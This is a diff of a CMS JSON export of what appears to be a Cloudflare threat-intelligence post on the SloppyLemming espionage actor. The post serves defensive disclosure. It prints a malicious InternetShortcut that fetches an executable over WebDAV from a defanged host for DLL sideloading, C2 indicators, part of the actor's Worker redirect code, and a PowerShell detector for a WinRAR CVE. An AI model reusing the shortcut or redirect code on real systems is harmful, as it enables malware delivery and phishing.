-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "[InternetShortcut]..URL=\\\\pitb.zapto[.]org@SSL@443\\webdav\\PITB-JR5124.exe..IconIndex=13..HotKey=0.IDList=..IconFile=C:\\ProgramFiles(x86)\\Microsoft\\Edge\\Application\\msedge.exe",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "The downloaded file, PITB-JR5124.exe (SHA256 hash: b53c7b13a4af47c3976bfad63fe9c5fd988dc0807dd040e8d63d790b65394afb), is a legitimate executable that is used to sideload a DLL named profapi.dll. Cloudforce One identified several malicious DLL files located within the directory pitb.zapto[.]org/webdav/, details of which can be found below.",
+													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "embedded-asset-block",
-											"data": {
-												"target": {
-													"sys": {
-														"id": "44pJRwKVSTdRgsSsvW0vLn",
-														"type": "Link",
-														"linkType": "Asset"
-													},
-													"related_asset": [
-														{
-															"contentfulId": "44pJRwKVSTdRgsSsvW0vLn",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 4",
-															"file": {
-																"name": "image 4.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/44pJRwKVSTdRgsSsvW0vLn/db26c64d067e45b5ad6e57fee4ab9af1/image_4.png",
-																"internal": {
-																	"mediaType": "image/png"
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "1FBPVEp80fQLa3K5z63tmN",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "1FBPVEp80fQLa3K5z63tmN",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 9",
+																	"markdown": "    [InternetShortcut]..URL=\\\\pitb.zapto[.]org@SSL@443\\webdav\\PITB-JR5124.exe..IconIndex=13..HotKey=0.IDList=..IconFile=C:\\ProgramFiles (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
 																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
 												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
+											"nodeType": "paragraph",
+											"data": {
+												"target": null,
 												"uri": null
 											},
 											"value": null,
 											"marks": null,
-											"content": []
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "The downloaded file, PITB-JR5124.exe (SHA256 hash: b53c7b13a4af47c3976bfad63fe9c5fd988dc\n0807dd040e8d63d790b65394afb), is a legitimate executable that is used to sideload a DLL named profapi.dll. Cloudforce One identified several malicious DLL files located within the directory pitb.zapto[.]org/webdav/, details of which can be found below.",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
+											"nodeType": "paragraph",
+											"data": {
+												"target": null,
+												"uri": null
+											},
+											"value": null,
+											"marks": null,
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "p8p29m6n1uxc2uYIdrElJ",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "p8p29m6n1uxc2uYIdrElJ",
+																	"locale": "en-US",
+																	"entryTitle": "Malware Operations - Table content 2 ",
+																	"markdown": "\n| SHA256 Hash     | Filename     | C2 Address     |\n| ---------- | ---------- | ---------- |\n|06f82a8d80ec911498e3493ebefa8ad45e102 dd887ce2edc11f8f51bafab2e80       | sspicli.dll      |pitb.gov-pkgov.workers[.]dev      |\n|ac3dff91982709f575cfbc6954b61130b4eeab 5d3759772db220f1b76836be4d      | profapi.dll      |pitb.gov-pkgov.workers[.]dev      |\n|3dfb8d198de95090e2ad3ffc9d9846af5 c3074563acb0ce5b0ef62b20e4bf432       | profapis.dll      |pitb.gov-pkgov.workers[.]dev     |\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
 										},
 										{
 											"nodeType": "paragraph",
@@ -4294,14 +2924,58 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "...",
+													"value": "",
+													"marks": [],
+													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "6SMBBkzXM6KsWldhAaJX1H",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "6SMBBkzXM6KsWldhAaJX1H",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 10",
+																	"markdown": "    JavaScript\n    ...\n     const targetDomain = 'aljazeerak[.]online';\n     const allowedUserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) MullaChrome/96.0.4664.110 Safari/537.36';\n      // Check the User-Agent header\n     if (request.headers.get('User-Agent') === allowedUserAgent) {\n       // Construct the new URL\n       const redirectURL = new URL(request.url);\n       redirectURL.hostname = targetDomain;\n       // Create a modified request\n       const modifiedRequest = new Request(redirectURL.toString(), {\n    ...\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
 													"marks": [],
 													"content": null
 												}
 											]
 										},
 										{
-											"nodeType": "paragraph",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -4315,179 +2989,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": " const targetDomain = 'aljazeerak[.]online';\n const allowedUserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) MullaChrome/96.0.4664.110 Safari/537.36';",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "  // Check the User-Agent header\n if (request.headers.get('User-Agent') === allowedUserAgent) {",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "   // Construct the new URL\n   const redirectURL = new URL(request.url);\n   redirectURL.hostname = targetDomain;",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "   // Create a modified request\n   const modifiedRequest = new Request(redirectURL.toString(), {",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-2",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Additional C2 Infrastructure And Traffic Analysis",
+													"value": "Additional C2 infrastructure and traffic analysis",
 													"marks": [],
 													"content": null
 												}
@@ -5169,8 +3671,8 @@
 															"locale": "en-US",
 															"title": "SloppyLemming - image 2",
 															"file": {
-																"name": "image 2.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/4L4z7J8sQ90lbWSTRpW2wO/380bcab6f805342902d139c7629a77df/image_2.png",
+																"name": "image1.png",
+																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/4L4z7J8sQ90lbWSTRpW2wO/7cc9e3ebb658628300dde73166d2d50a/image1.png",
 																"internal": {
 																	"mediaType": "image/png"
 																}
@@ -5208,8 +3710,8 @@
 															"locale": "en-US",
 															"title": "SloppyLemming - image 6",
 															"file": {
-																"name": "image 6 - chart.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/g2HyisO6n9UqR71ETV4R0/8aa39418390f7aeb13f26395b3628328/image_6_-_chart.png",
+																"name": "image3.png",
+																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/g2HyisO6n9UqR71ETV4R0/aed289ab51a6f5451026e631f794aafa/image3.png",
 																"internal": {
 																	"mediaType": "image/png"
 																}
@@ -5275,7 +3777,7 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -5289,7 +3791,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "SloppyLemming Targeting and Victimology",
+													"value": "SloppyLemming targeting and victimology",
 													"marks": [],
 													"content": null
 												}
@@ -5873,7 +4375,7 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -5978,45 +4480,6 @@
 											]
 										},
 										{
-											"nodeType": "embedded-asset-block",
-											"data": {
-												"target": {
-													"sys": {
-														"id": "4wYAgbpsJrP0YHaiaxH7I5",
-														"type": "Link",
-														"linkType": "Asset"
-													},
-													"related_asset": [
-														{
-															"contentfulId": "4wYAgbpsJrP0YHaiaxH7I5",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 6 events",
-															"file": {
-																"name": "image 6 - events.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/4wYAgbpsJrP0YHaiaxH7I5/08e8a0d58feca808e61d2f3e4adce1d9/image_6_-_events.png",
-																"internal": {
-																	"mediaType": "image/png"
-																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
-												},
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": []
-										},
-										{
 											"nodeType": "paragraph",
 											"data": {
 												"target": null,
@@ -6034,11 +4497,55 @@
 													"value": "",
 													"marks": [],
 													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "5IqCMWdyUtGbf2xVD0oJb6",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "5IqCMWdyUtGbf2xVD0oJb6",
+																	"locale": "en-US",
+																	"entryTitle": "Event timeline - Content table",
+																	"markdown": "\n| Date     | Event Description     |\n| ---------- | ---------- |\n| 2024-09-17 16:49 | Cloudforce One develops and begins testing mitigation for SloppyLemming|\n| 2024-09-20 16:49       |Cloudforce One notifies GitHub to take down the actor's GitHub account       |\n| 2024-09-20 16:49       |Cloudforce One notifies Discord about TA's usage of Discord for mitigation    |\n| 2024-09-20 16:12       |Cloudforce One disables the running Workers      |\n| 2024-09-23 14:11      |Cloudforce One notifies Dropbox about TA's usage of Discord for mitigation  |\n|2024-09-24 09:00 |Cloudforce One publishes the results of this investigation\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
 												}
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -6052,7 +4559,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Coordinating our SloppyLemming Response",
+													"value": "Coordinating our SloppyLemming response",
 													"marks": [],
 													"content": null
 												}
@@ -6080,7 +4587,7 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -6195,81 +4702,6 @@
 											]
 										},
 										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "CVE-2023-38831",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Description:winrar exploit detection ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "open suspios (.tar / .zip / .rar) and run this script to check it ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
 											"nodeType": "paragraph",
 											"data": {
 												"target": null,
@@ -6284,700 +4716,44 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "\nfunction winrar-exploit-detect(){",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
+													"value": "",
+													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
+														"target": {
+															"sys": {
+																"id": "3E64myoG5Q4RRkbsvShWhx",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "3E64myoG5Q4RRkbsvShWhx",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 11",
+																	"markdown": "    CVE-2023-38831\n    Description:winrar exploit detection \n    open suspios (.tar / .zip / .rar) and run this script to check it \n\n    function winrar-exploit-detect(){\n    $targetExtensions = @(\".cmd\" , \".ps1\" , \".bat\")\n    $tempDir = [System.Environment]::GetEnvironmentVariable(\"TEMP\")\n    $dirsToCheck = Get-ChildItem -Path $tempDir -Directory -Filter \"Rar*\"\n    foreach ($dir in $dirsToCheck) {\n      $files = Get-ChildItem -Path $dir.FullName -File\n      foreach ($file in $files) {\n        $fileName = $file.Name\n        $fileExtension = [System.IO.Path]::GetExtension($fileName)\n        if ($targetExtensions -contains $fileExtension) {\n          $fileWithoutExtension = [System.IO.Path]::GetFileNameWithoutExtension($fileName); $filename.TrimEnd() -replace '\\.$'\n          $cmdFileName = \"$fileWithoutExtension\"\n          $secondFile = Join-Path -Path $dir.FullName -ChildPath $cmdFileName\n\n          if (Test-Path $secondFile -PathType Leaf) {\n            Write-Host \"[!] Suspicious pair detected \"\n            Write-Host \"[*]  Original File:$($secondFile)\" -ForegroundColor Green \n            Write-Host \"[*] Suspicious File:$($file.FullName)\" -ForegroundColor Red\n\n            # Read and display the content of the command file\n            $cmdFileContent = Get-Content -Path $($file.FullName)\n            Write-Host \"[+] Command File Content:$cmdFileContent\"\n        }\n       }\n      }\n     }\n    }w\n    winrar-exploit-detect\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
 														"uri": null
 													},
-													"value": "$targetExtensions = @(\".cmd\" , \".ps1\" , \".bat\")",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "$tempDir = [System.Environment]::GetEnvironmentVariable(\"TEMP\")",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "$dirsToCheck = Get-ChildItem -Path $tempDir -Directory -Filter \"Rar*\"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "foreach ($dir in $dirsToCheck) {",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "    $files = Get-ChildItem -Path $dir.FullName -File",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "    foreach ($file in $files) {",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        $fileName = $file.Name",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        $fileExtension = [System.IO.Path]::GetExtension($fileName)",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        if ($targetExtensions -contains $fileExtension) {",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "            $fileWithoutExtension = [System.IO.Path]::GetFileNameWithoutExtension($fileName); $filename.TrimEnd() -replace '\\.$'",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "            $cmdFileName = \"$fileWithoutExtension\"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "            $secondFile = Join-Path -Path $dir.FullName -ChildPath $cmdFileName",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "            ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "            if (Test-Path $secondFile -PathType Leaf) {",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "                Write-Host \"[!] Suspicious pair detected \"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "                Write-Host \"[*]  Original File:$($secondFile)\" -ForegroundColor Green ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "                Write-Host \"[*] Suspicious File:$($file.FullName)\" -ForegroundColor Red",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "\n",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "                # Read and display the content of the command file",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "                $cmdFileContent = Get-Content -Path $($file.FullName)",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "                Write-Host \"[+] Command File Content:$cmdFileContent\"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "            }",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        }",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "    }",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "}",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "}w",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "winrar-exploit-detect",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
@@ -7050,143 +4826,41 @@
 													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
+														"target": {
+															"sys": {
+																"id": "5cwmACz0iQxuYTSJSWhk36",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
